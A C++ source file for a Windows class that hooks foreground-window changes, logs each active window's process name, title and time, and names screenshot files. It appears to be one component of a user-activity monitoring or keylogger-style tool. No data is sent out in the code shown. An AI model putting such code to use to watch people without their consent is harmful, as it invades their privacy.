#include <winsock2.h>
#include <psapi.h>
#include <synchapi.h>
#include <ctime>
#include "systemLogger.hpp"
#include "LoggerHandler.hpp"

LoggerHandler	*SystemLogger::_handler = nullptr;
HWND			SystemLogger::_hwnd = nullptr;

SystemLogger::SystemLogger()
{
	_hwnd = GetFocus();
}

SystemLogger::SystemLogger(LoggerHandler *handler)
{
	_handler = handler; 
}

SystemLogger::~SystemLogger()
{
}

VOID CALLBACK	SystemLogger::WinEventProcCallback(HWINEVENTHOOK hWinEventHook, DWORD dwEvent,
	HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime)
{
	_handler->getLog();
	_hwnd = hwnd;
}

bool			SystemLogger::start()
{
	if ((_systemHook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL,
		this->WinEventProcCallback, 0, 0, WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS)) == 0)
	return false;
	return true;
}

void			SystemLogger::stop()const
{
	UnhookWinEvent(_systemHook);
}

std::string		SystemLogger::getLog()
{
	std::string result ="";
	std::string tmp;

	tmp = getWindowName();
	if (tmp == "")
		return "";
	result += getProcName(); 
	result += tmp;
	result += getDate();
	return result;
}

std::string		SystemLogger::getNameForScreenshot()const
{
	std::string tmp;
	std::string result;

	tmp = getWindowName();
	if (tmp.size() > 3)
	{
		tmp.erase(0, _flag.size() + 11);
		tmp = tmp.substr(0, tmp.size() - _flag.size());
		result += tmp;
	}
	else
		result = "Screenshot";

	tmp = getDate();
	tmp.erase(0, _flag.size() + 9);
	tmp = tmp.substr(0, tmp.size() - _flag.size());

	result += "--" + tmp + ".bmp";
	return result;
}


std::string		SystemLogger::getProcName()const
{
	CHAR		tmpName[MAX_PATH];
	DWORD		idproc;
	HANDLE		hProcess;
	std::string result = _flag + "processName:";

	ZeroMemory(tmpName, MAX_PATH);
	GetWindowThreadProcessId(_hwnd, &idproc);
	if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, idproc)) == NULL)
		result += "UNDEFINED";
	else
	{
		GetModuleBaseNameA(hProcess, nullptr, tmpName, MAX_PATH);
		result += tmpName;
	}
	result += _flag;
	return result;
}

std::string		SystemLogger::getWindowName()const
{
	CHAR		tmpName[MAX_PATH];
	std::string	result = _flag + "windowName:";
	std::string	windowName;

	ZeroMemory(tmpName, MAX_PATH);
	GetWindowText(_hwnd, tmpName, MAX_PATH);
	windowName = tmpName;
	if (windowName == "Task Switching")
		return "";
	result += tmpName;
	result += _flag;
	return result;
}

std::string		SystemLogger::getDate()const
{
	std::string result = _flag + "dateTime:";
	time_t curTime;
	struct tm locTime;
	const int timeStrLen = 26;
	char timeStr[timeStrLen];

	if ((-1 != time(&curTime))
		&& (0 == localtime_s(&locTime, &curTime))
		&& (0 == asctime_s(timeStr, timeStrLen, &locTime)))
		result += timeStr;
	result = result.substr(0, result.size() - 1);
	result += _flag;
	return result;
}



